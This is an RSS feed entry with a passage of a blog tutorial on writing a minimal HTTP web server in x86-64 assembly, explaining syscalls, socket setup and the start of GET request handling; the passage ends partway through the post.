            <link>https://namberino.github.io/posts/2025/01/lets-make-an-http-server-with-assembly/</link>
            <pubDate>Fri, 17 Jan 2025 22:37:58 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2025/01/lets-make-an-http-server-with-assembly/</guid>
            <description>&lt;p&gt;One of the things that makes me happy is understanding how something works at its core. That&amp;rsquo;s basically the main reason why I built this HTTP web server entirely in x86 Assembly. Assembly is the lowest level you can go in a computer before you start working with machine code and building an HTTP server requires an understanding of networking.&lt;/p&gt;
&lt;p&gt;This project was really fun. It really put my Assembly, multi-processing, and syscall knowledge to the test and I hope you will learn something about Assembly, networking, and low level systems. Let&amp;rsquo;s start with some basics to set the stage.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>One of the things that makes me happy is understanding how something works at its core. That&rsquo;s basically the main reason why I built this HTTP web server entirely in x86 Assembly. Assembly is the lowest level you can go in a computer before you start working with machine code and building an HTTP server requires an understanding of networking.</p>
<p>This project was really fun. It really put my Assembly, multi-processing, and syscall knowledge to the test and I hope you will learn something about Assembly, networking, and low level systems. Let&rsquo;s start with some basics to set the stage.</p>
<h2 id="how-the-internet-works">How the Internet works</h2>
<p>Have you ever wondered what happens when you enter a link into your browser? How did the browser get the website?</p>
<p>When you enter a link into your browser&rsquo;s search bar, the browser will make an HTTP request, particularly a GET request, to the web server associated with the domain of in the URL.</p>
<p>Here&rsquo;s a high-level break down of all the processes that goes into a website request:</p>
<ul>
<li>DNS resolution: The browser will give the DNS (Domain Name System) the request domain to get an IP address.</li>
<li>Server connection: The browser starts connecting to the server with the specified IP address usually through TCP.</li>
<li>HTTP request: After connecting to the server, the browser sends a GET request to request resources from the server.</li>
<li>Server response: The server will process the request and send back an HTTP response, which may contain the requested resources or an error message if the server couldn&rsquo;t process the request.</li>
<li>Response acceptance: The browser will take the HTTP response and render the website or modify the rendered website.</li>
</ul>
<h2 id="intro-to-assembly">Intro to Assembly</h2>
<p>Assembly knowledge is a prerequisite for this project. I&rsquo;ll go over Assembly briefly as a refresher but if you don&rsquo;t know Assembly, I highly recommend learning it from <a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html"><strong>here</strong></a>.</p>
<p>Assembly is a low level programming language, it&rsquo;s the lowest you could go before you start writing machine code itself. It basically provides a way to write instructions that interacts directly with the underlying computer architecture. Assembly allows for deep control over hardware and system resources.</p>
<p>Each different computer architecture has a different flavor of Assembly, which contain will different instructions, though some instructions will persist across architectures.</p>
<p>When programming with Assembly, the main idea is moving data around between memory and registers and invoking interrupts to perform some calculation or processing. Look into any Assembly project and you&rsquo;ll see the myriad of <code>mov</code> instructions used to move data around and many interrupt instructions. Heck, there&rsquo;s even an entire <a href="https://github.com/xoreaxeaxeax/movfuscator"><strong>project</strong></a> that translate your C code into a bunch of <code>mov</code> instructions.</p>
<p><code>mov</code> is not the only thing Assembly can do though. Each flavor of Assembly usually comes with some arithmetic operations on registers and memory like <code>add</code>, <code>sub</code>, along with control flow instructions that allows you to jump to different parts of the code like <code>jmp</code>, <code>je</code>, <code>jne</code>, etc.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">.intel_syntax</span> <span style="color:#66d9ef">noprefix</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_start:
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">rdi</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">12</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">0x7f454c46</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">je</span> <span style="color:#66d9ef">CON_1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">0x00005A4D</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">je</span> <span style="color:#66d9ef">CON_2</span>
</span></span></code></pre></div><p>Interrupts will <em>interrupt</em> the currently executing process to process an event. We&rsquo;ll be working with interrupts a lot for this, mainly because syscall is essentially interrupts. When an interrupt is invoked, it transfers the program flow to the specified handler. The interrupt handler is specified in what&rsquo;s called the <a href="https://en.wikipedia.org/wiki/Interrupt_vector_table"><strong>Interrupt Vector Table</strong></a> (IVT).</p>
<p>We&rsquo;re particularly interested in the UNIX syscall interrupt, specified by the interrupt vector <code>0x80</code>. We&rsquo;ll be using this extensively, but first, let&rsquo;s take a look at what syscalls are.</p>
<h2 id="syscalls-basics">Syscalls basics</h2>
<p>System calls (or syscalls for short) are interfaces between the user space and the kernel space. User space is where user applications and software is executed. Kernel space is where the kernel resides. The kernel is the most important part of an OS. It sits between the higher-level applications and the lower-level hardware and facilitates communication between the two.</p>

    <img src="/img/asm-webserver/kernel-space-diagram.png"  alt="Kernel space diagram"  class="center"  style="padding: 20px"  />


<p>Applications in the user space interract with the kernel through syscalls. Syscalls allows the applications to request services from the OS, like networking, file operations, process control, etc.</p>
<p>On UNIX systems, syscalls are invoked through the interrupt vector <code>0x80</code>. The syscall service that we want to request is specified in the <code>eax</code> register. We&rsquo;ll be following the <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI"><strong>System V AMD64 ABI</strong></a> when we&rsquo;re passing parameters to these syscalls. Below is an example on how to call the <code>exit</code> syscall, which will exit the executing program with a specified exit code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># exit(0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#ae81ff">0</span>        <span style="color:#75715e"># exit code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">60</span>       <span style="color:#75715e"># sys_exit
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><p>So we passed the exit code into the <code>rdi</code> register, pass the syscall service number that we want to request into the <code>rax</code> register, then invoke the syscall interrupt. There are many different syscalls with different syscall service number, you can find all of them in the <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/"><strong>syscall table</strong></a>.</p>
<h2 id="all-about-sockets">All about sockets</h2>
<p>If you&rsquo;ve ever studied about networking, you&rsquo;d be quite familiar with the concept of <em>sockets</em>. Sockets are software objects that allows you to bind and listen on an endpoint and send or receive data through that endpoint to other devices and other networks. It&rsquo;s used extensively in the Internet. The socket address will contain the triad of the Internet protocol: transport protocol, IP address, and port number.</p>
<p>Socket programming means connecting 2 sockets together to communicate with each other. One socket will listen on a particular port at a particular IP while the other socket will connect to that listening socket to form a connection. Below is a diagram of how this connection and communication process works.</p>

    <img src="/img/asm-webserver/socket-flow-diagram.png"  alt="Socket flow diagram"  class="center"  style="padding: 40px"  />


<p>So how exactly do sockets work and how can we program one? There&rsquo;s a few steps to making a socket:</p>
<ol>
<li><em>Create a socket</em>: We can use the <code>socket</code> syscall to create a socket object. We can specify the type of IP address to use and which communication protocol to use.</li>
<li><em>Bind the socket</em>: We can use the <code>bind</code> syscall to bind the created socket to a particular network interface on a particular port. The socket will then be able to communicate and listen on the port of that network interface.</li>
<li><em>Listen for connection requests</em>: We can use the <code>listen</code> syscall to put the socket into listen mode, where it listens for connection requests to that particular port on that particular interface. It will process requests in queue, multiple pending connections will be put on a queue so that they could be processed sequentially. If the queue is full, new connection requests will be denied.</li>
<li><em>Accept the connection request</em>: We can use the <code>accept</code> syscall to accept the first connection request in the connection request queue. Once a request has been accepted, we can communicate with the connected device via that connection.</li>
<li><em>Communicate with the connection</em>: We can use the <code>write</code> and <code>read</code> syscall to exchange data with the connected device. These syscalls will operate on the accepted connection&rsquo;s file descriptor returned from the <code>accept</code> syscall.</li>
</ol>
<h2 id="assembly-web-server-specification">Assembly web server specification</h2>
<p>Now comes the fun part, actually building the web server. First we&rsquo;ll need to specify what feature this web server will have.</p>
<p>The web server won&rsquo;t be super complicated. We&rsquo;ll build something that can accept multiple connections and handle multiple connections. It should also be able to handle 2 types of HTTP requests: the GET request and the POST request.</p>
<p>For Assembly flavor, we&rsquo;ll be using x86 Assembly with the Intel syntax. Our assembler is the GNU Assembler. Our targeted OS is Linux.</p>
<h2 id="assembly-socket-programming">Assembly socket programming</h2>
<p>So using the above concepts, we can use syscalls to create our sockets that will listen for connections and accept HTTP requests.</p>
<h3 id="creating-the-socket-object">Creating the socket object</h3>
<p>Firstly, we need to create a socket object with the <code>socket</code> syscall:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># create socket object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dil</span>, <span style="color:#ae81ff">2</span>        <span style="color:#75715e"># AF_INET
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">sil</span>, <span style="color:#ae81ff">1</span>        <span style="color:#75715e"># SOCK_STREAM
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">0</span>         <span style="color:#75715e"># IPPROTO_IP 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">41</span>       <span style="color:#75715e"># sys_socket
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r8</span>, <span style="color:#66d9ef">rax</span>       <span style="color:#75715e"># socket fd
</span></span></span></code></pre></div><p>This calls the socket syscall with 3 arguments and stores the file descriptor for the created socket object in the <code>r8</code> register. We&rsquo;re creating a socket object for the IPv4 protocol (<code>AF_INET</code>), with the TCP protocol (<code>SOCK_STREAM</code>), and for the Internet Protocol (<code>IPPROTO_IP</code>).</p>
<h3 id="binding-the-socket-object">Binding the socket object</h3>
<p>Next, we bind the socket to a particular network interface using the <code>bind</code> syscall. The <code>bind</code> syscall takes in 3 arguments: socket file descriptor, socket address structure, address length. The socket file descriptor is taken from the output of the <code>socket</code> syscall. The socket address length is the size of the socket address structure, which will be 16 bytes. The socket address structure will look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sockaddr_in {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">sa_family_t</span> sin_family;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">in_port_t</span> sin_port;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> in_addr sin_addr;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here&rsquo;s what each properties of this structure means:</p>
<ul>
<li><code>sin_family</code> will specify which version of IP we&rsquo;ll use (<code>AF_INET</code> for our case since we want to use IPv4).</li>
<li><code>sin_port</code> will specify which port the socket will listen on (<code>80</code> for our case, which is the standard HTTP port).</li>
<li><code>sin_addr</code> will specify which network interface we will listen on (<code>0.0.0.0</code> for our case, which means we&rsquo;ll listen on all network interface on the system).</li>
</ul>
<p>Side note first, on Intel systems, we use the <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> system, meaning the least significant byte will go in the lower address. so something like <code>0x1234</code> will be stored in memory as <code>0x34</code> then <code>0x12</code>. However, networking usually uses the big endian system instead, which is the opposite of little endian.</p>
<p>We can create our socket address structure by creating the structure in the <code>.data</code> section of our program. Since our structure has to be 16 bytes, we&rsquo;ll need to add some padding bytes to our structure.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">.section</span> <span style="color:#66d9ef">.data</span>
</span></span><span style="display:flex;"><span>sockaddr:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">2</span>                 <span style="color:#75715e"># AF_INET
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">.word</span> <span style="color:#ae81ff">0x5000</span>            <span style="color:#75715e"># port 80 (0x50 in hexadecimal)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">.double</span> <span style="color:#ae81ff">0x00000000</span>      <span style="color:#75715e"># 0.0.0.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">.byte</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>   <span style="color:#75715e"># padding bytes
</span></span></span></code></pre></div><p>With this structure, we can now bind the socket using the <code>bind</code> syscall:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># bind the socket
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r8</span>         <span style="color:#75715e"># socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">sockaddr</span>   <span style="color:#75715e"># sockaddr struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">16</span>          <span style="color:#75715e"># sockaddr length
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">49</span>         <span style="color:#75715e"># sys_bind
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><h3 id="listening-for-connection-on-the-socket">Listening for connection on the socket</h3>
<p>Now that we have binded the socket object, we can start listening for connections. This is pretty simple, we just use the <code>listen</code> syscall.</p>
<p>The <code>listen</code> syscall takes in 2 parameters: the socket file descriptor and the backlog. The backlog determines the max length of the queue for pending connections. Let&rsquo;s just set the backlog to 0, because if <code>listen</code> receives 0 as the backlog argument, it will set the queue length to the implementation&rsquo;s minimum value (according to <a href="https://pubs.opengroup.org/onlinepubs/009695399/functions/listen.html"><strong>this</strong></a>), which means we won&rsquo;t have to bother with determining the minimum queue length.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># listen on the binded socket
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r8</span>     <span style="color:#75715e"># get socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0</span>      <span style="color:#75715e"># queue length
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">50</span>     <span style="color:#75715e"># sys_listen
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><h3 id="accepting-a-connection-on-the-socket">Accepting a connection on the socket</h3>
<p>Now we can accept connection requests. We can use the <code>accept</code> syscall.</p>
<p>The <code>accept</code> syscall is used with connection-based socket types like <code>SOCK_STREAM</code>. It extracts the first connection request on the queue of pending connections for the listening socket, creates an new connected socket, and returns a file descriptor referring to that new connected socket.</p>
<p>It takes in 3 parameters: the socket file descriptor, the <code>sockaddr</code> structure, and the address length. The <code>sockaddr</code> structure will contain the address of the peer for the accepted connection (the address of the client). The structure will be filled in by <code>accept</code> if we set it to <code>NULL</code>. Same goes for the address length, which contains the size of the peer address.</p>
<p>Since we want to accept any connection, we would want to set the structure argument to <code>NULL</code> since there&rsquo;s no way we can know what the client&rsquo;s address will be. We&rsquo;ll return the file descriptor to the accepted connection in the register <code>r9</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># accept connections
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r8</span>     <span style="color:#75715e"># get socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x0</span>    <span style="color:#75715e"># NULL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">0x0</span>    <span style="color:#75715e"># NULL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">43</span>     <span style="color:#75715e"># sys_accept
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r9</span>, <span style="color:#66d9ef">rax</span>     <span style="color:#75715e"># accepted socket fd
</span></span></span></code></pre></div><h3 id="communicating-with-the-connection">Communicating with the connection</h3>
<p>Now that we&rsquo;ve accepted a connection, we can communicate with it by writing to and reading the HTTP request from the accepted connection&rsquo;s file descriptor. We do this via the <code>write</code> syscall and the <code>read</code> syscall.</p>
<p>We can read the request from the connection using the <code>read</code> syscall. The <code>read</code> syscall takes in 3 parameters: the file descriptor to read from, the pointer to a buffer to read to, and the count, which is the size of the buffer. It will return the number of bytes read on success.</p>
<p>So we need to create a read buffer in the <code>.data</code> section to store the request. We do this by using the <code>.skip</code> directive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>read_buffer:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.skip</span> <span style="color:#ae81ff">1024</span>
</span></span></code></pre></div><p>Now we can use the <code>read</code> syscall to read the request into the buffer through the accepted connection&rsquo;s file descriptor.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># read the request
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>            <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">read_buffer</span>   <span style="color:#75715e"># read buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">1024</span>          <span style="color:#75715e"># buffer size
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0</span>             <span style="color:#75715e"># sys_read
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><p>We can write a response to the connection using the <code>write</code> syscall. The <code>write</code> syscall takes in the same 3 parameters as the <code>read</code> syscall. It will write the data from the buffer, with the count parameter specifying how many bytes to write. For now, we&rsquo;ll write a <code>200 OK</code> response message. We can specify this response message in the <code>.rodata</code> section (Read-only data).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">.section</span> <span style="color:#66d9ef">.rodata</span>
</span></span><span style="display:flex;"><span>response_msg:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.string</span> <span style="color:#e6db74">&#34;HTTP/1.0 200 OK\r\n\r\n\0&#34;</span>
</span></span></code></pre></div><p>Now we can use the <code>write</code> syscall to write the response message to the accepted connection through its file descriptor. This reponse message will make its way to the client.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># write the response
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>             <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">response_msg</span>   <span style="color:#75715e"># write buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">19</span>             <span style="color:#75715e"># buffer size
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">1</span>              <span style="color:#75715e"># sys_write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><h3 id="closing-the-connection">Closing the connection</h3>
<p>After we finished processing the current connection, we need to close the connection and listen to new connections. We do this using the <code>close</code> syscall, which takes in 1 argument, the file descriptor to close.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># close the accepted connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><p>Then we need to jump back to the <code>accept</code> part of the code after closing the previous accepted connection. This would allow us to keep accepting new connections.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>accept_conn:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># accept connection to socket
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r8</span>       <span style="color:#75715e"># get socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x0</span>      <span style="color:#75715e"># NULL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">0x0</span>      <span style="color:#75715e"># NULL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">43</span>       <span style="color:#75715e"># sys_accept
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close the accepted connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">accept_conn</span>
</span></span></code></pre></div><h2 id="handling-get-requests">Handling GET requests</h2>
<p>Now that we have the socket programmed, we need to create ways to handle the different types of HTTP requests that the client may make.</p>
<p>Let&rsquo;s focus on the GET request first. The GET request indicates resource request. It will specify an endpoint that it would like to get, and the server will process that and return that request. Of course this is really simplified, there&rsquo;s no security mechanism here because our server is very simple.</p>
<p>A simple GET request will look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>GET /tmp/resource HTTP/1.1
</span></span></code></pre></div><p>This request will request the <code>/tmp/resource</code> file. The server will try to get the resource and return to the client. The <code>HTTP/1.1</code> specifies the version of HTTP that&rsquo;s being used. If we want to process the GET request, we&rsquo;ll need to extract the requested resource from the request. Since we&rsquo;ve read the request into a buffer called <code>read_buffer</code>, we can extract information about the request from that buffer.</p>
<p>We need to create 2 new buffers using the <code>.skip</code> directive in the <code>.data</code> section, 1 for storing the request type, 1 for storing the requested resource.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>filename:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.skip</span> <span style="color:#ae81ff">1024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file_content:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.skip</span> <span style="color:#ae81ff">1024</span>
</span></span></code></pre></div><p>Now, we&rsquo;ll extract the request type. This will come in handy later on.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># get request type
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">request_type</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">read_buffer</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">0</span>              <span style="color:#75715e"># start index
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">call</span> <span style="color:#66d9ef">get_substring</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r10</span>, <span style="color:#66d9ef">rax</span>            <span style="color:#75715e"># end index
</span></span></span></code></pre></div><p>After that, we&rsquo;ll extract the requested resource.</p>
